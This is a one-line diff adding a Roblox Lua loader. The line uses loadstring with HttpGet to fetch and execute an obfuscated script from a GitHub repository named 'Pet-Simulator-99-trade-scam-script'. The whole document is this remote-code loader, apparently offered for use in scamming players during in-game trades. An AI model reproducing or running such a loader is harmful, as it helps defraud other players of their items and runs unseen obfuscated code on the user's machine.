@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nexer39/Pet-Simulator-99-trade-scam-script/refs/heads/main/obf_YZI7LY12HXon01c5j5w30IWE4gn9ghl08gWYOAgL4bSeX69F70d00qfJxsjfbUw4.lua"))()
